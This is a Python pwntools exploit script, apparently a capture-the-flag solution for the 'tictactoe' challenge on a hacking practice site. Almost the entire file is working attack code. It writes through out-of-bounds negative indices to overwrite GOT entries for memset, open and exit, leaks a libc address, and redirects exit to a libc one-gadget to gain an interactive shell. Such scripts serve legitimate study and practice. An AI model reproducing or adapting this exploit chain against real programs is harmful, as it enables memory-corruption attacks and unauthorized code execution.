#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import sys
from termios import tcflush, TCIFLUSH

context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

localMAGIC = 0x3ac5c      #locallibc
remoteMAGIC = 0x3ac3e      #remotelibc   #libc6_2.23-0ubuntu3_i386.so

def debug(addr = '0x08048CF2'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

def input_number(number):
    io.recv()
    io.sendline('9')
    #time.sleep(2)
    io.send(number)
def input_addr(addr):
    io.recvuntil('Input move (9 to change flavor): ')
    io.sendline(addr)


elf = ELF('/home/h11p/hackme/tictactoe')


io = process('/home/h11p/hackme/tictactoe')
#io = remote('hackme.inndy.tw', 7714)
#debug()
io.recvuntil('Play (1)st or (2)nd? ')
io.sendline('1')
#change memset to loop
input_number(p32(0xd5))
input_addr('-34')
input_number(p32(0x8b))
input_addr('-33')
tcflush(sys.stdin, TCIFLUSH)

#change open to printf_flag
input_number(p32(0xb4))
input_addr('-42')
input_number(p32(0x8c))
input_addr('-41')
input_number(p32(0x04))
input_addr('-40')
input_number(p32(0x08))
input_addr('-39')
tcflush(sys.stdin, TCIFLUSH)

#change exit to loop
input_number(p32(0xd5))
input_addr('-46')
input_number(p32(0x8b))
input_addr('-45')
input_number(p32(0x04))
input_addr('-44')
input_number(p32(0x08))
input_addr('-43')
tcflush(sys.stdin, TCIFLUSH)

#success get flag
input_number(p32(0xff))
input_addr('-9')
input_number(p32(0xff))
input_addr('-8')
input_number(p32(0xff))
input_addr('-7')
tcflush(sys.stdin, TCIFLUSH)

libc_leak=io.recv().splitlines()[1][19:23]
libc_leak=u32(libc_leak)
print hex(libc_leak)
libc_base=libc_leak-0x3f12
print "libc_base:"+hex(libc_base)
MAGIC_addr=libc_base+localMAGIC
print "MAGIC_addr:"+hex(MAGIC_addr)

#unsuccess get flag
input_number(p32(0x01))
input_addr('-9')
tcflush(sys.stdin, TCIFLUSH)

#change exit to MAGIC_addr
exit_addr=-46
for i in str(MAGIC_addr):
    input_number(i)
    input_addr(str(exit_addr))
    exit_addr=exit_addr+1
tcflush(sys.stdin, TCIFLUSH)

#success get flag
input_number(p32(0xff))
input_addr('-9')
input_number(p32(0xff))
input_addr('-8')
input_number(p32(0xff))
input_addr('-7')
tcflush(sys.stdin, TCIFLUSH)


io.interactive()
#io.recv()


